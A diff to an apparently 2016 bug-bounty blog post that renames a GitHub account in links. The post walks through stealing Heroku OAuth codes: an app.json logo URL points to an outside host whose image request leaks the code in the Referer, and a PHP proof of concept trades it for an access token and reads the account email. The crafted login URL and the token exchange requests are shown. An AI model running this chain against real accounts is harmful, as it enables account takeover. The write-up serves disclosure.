@@ -14,7 +14,7 @@ You can notice the button on Github like here: <a href="https://github.com/Parse
 
 Anyone can create a Button: <a href="https://devcenter.heroku.com/articles/heroku-button" target="_blank">https://devcenter.heroku.com/articles/heroku-button</a>. 
 
-I created a Button <a href="https://github.com/esevece/heroku_test" target="_blank">https://github.com/esevece/heroku_test</a> that only includes the required file `app.json`. Because `app.json` is the file from where Heroku gets the information about the Button.
+I created a Button <a href="https://github.com/stefanocoding/heroku_test" target="_blank">https://github.com/stefanocoding/heroku_test</a> that only includes the required file `app.json`. Because `app.json` is the file from where Heroku gets the information about the Button.
 
 I tried injecting HTML attributes and tags in `app.json` to achieve XSS, but the special characters are being escaped in the client side (if you can do it, <a href="https://bugcrowd.com/heroku" target="_blank">report it!</a>). However, I noticed that I can set the URL of the `"logo"` to any value. This URL is used as the `src` of an `<img>` created when _https://dashboard.heroku.com/new_ is loaded.
 
@@ -36,7 +36,7 @@ Only worked if the user was already authenticated.
 
 1. Send user to
 
-        https://longboard.heroku.com/login?state=https%3A%2F%2Fdashboard.heroku.com%2Fnew%3Ftemplate%3Dhttps%253A%252F%252Fgithub.com%252Fesevece%252Fheroku_test
+        https://longboard.heroku.com/login?state=https%3A%2F%2Fdashboard.heroku.com%2Fnew%3Ftemplate%3Dhttps%253A%252F%252Fgithub.com%252Fstefanocoding%252Fheroku_test
 
     ![1]({{ "/screenshots/2016-06-01-1.png" | prepend: site.baseurl | prepend: site.url }})
 
@@ -56,14 +56,14 @@ Only worked if the user was already authenticated.
 
 4. And finally, the user is redirected to
 
-        https://dashboard.heroku.com/new?template=https%3A%2F%2Fgithub.com%2Fesevece%2Fheroku_test&code=...
+        https://dashboard.heroku.com/new?template=https%3A%2F%2Fgithub.com%2Fstefanocoding%2Fheroku_test&code=...
 
     ![6]({{ "/screenshots/2016-06-01-6.png" | prepend: site.baseurl | prepend: site.url }})
     ![7]({{ "/screenshots/2016-06-01-7.png" | prepend: site.baseurl | prepend: site.url }})
 
 5. Once the page loads, a request is made to the Github API to get the file __app.json__
 
-        https://api.github.com/repos/esevece/heroku_test/contents/app.json?ref=master
+        https://api.github.com/repos/stefanocoding/heroku_test/contents/app.json?ref=master
 
     ![8]({{ "/screenshots/2016-06-01-8.png" | prepend: site.baseurl | prepend: site.url }})
     ![9]({{ "/screenshots/2016-06-01-9.png" | prepend: site.baseurl | prepend: site.url }})
@@ -71,21 +71,21 @@ Only worked if the user was already authenticated.
 6. The `<img src="https://u00f1.xyz/heroku/poc.php">` is created and the "image" is loaded, sending the __code__ in the `Referer`
     ![10]({{ "/screenshots/2016-06-01-10.png" | prepend: site.baseurl | prepend: site.url }})
 
-7. My file <a href="https://github.com/esevece/esevece.github.io/blob/master/code/2016-06-01-poc.php" target="_blank">poc.php</a> captures the `Referer`, extracts the __code__ and makes a POST request to 
+7. My file <a href="https://github.com/stefanocoding/stefanocoding.github.io/blob/master/code/2016-06-01-poc.php" target="_blank">poc.php</a> captures the `Referer`, extracts the __code__ and makes a POST request to 
 
         https://longboard.heroku.com/login/token
 
     with the value of the parameter __password__ set to the value of __code__
     ![11]({{ "/screenshots/2016-06-01-11.png" | prepend: site.baseurl | prepend: site.url }})
 
-8. <a href="https://github.com/esevece/esevece.github.io/blob/master/code/2016-06-01-poc.php" target="_blank">poc.php</a> takes the `"access_token"` from the last response and makes a GET request to 
+8. <a href="https://github.com/stefanocoding/stefanocoding.github.io/blob/master/code/2016-06-01-poc.php" target="_blank">poc.php</a> takes the `"access_token"` from the last response and makes a GET request to 
 
         https://api.heroku.com/account
 
     with the header `Authorization:` set to `Bearer [the_access_token]`
     ![12]({{ "/screenshots/2016-06-01-12.png" | prepend: site.baseurl | prepend: site.url }})
 
-9. <a href="https://github.com/esevece/esevece.github.io/blob/master/code/2016-06-01-poc.php" target="_blank">poc.php</a> takes the `"email"` from the last response and sends an email to the address
+9. <a href="https://github.com/stefanocoding/stefanocoding.github.io/blob/master/code/2016-06-01-poc.php" target="_blank">poc.php</a> takes the `"email"` from the last response and sends an email to the address
     ![13]({{ "/screenshots/2016-06-01-13.png" | prepend: site.baseurl | prepend: site.url }})
 
 Art Attack
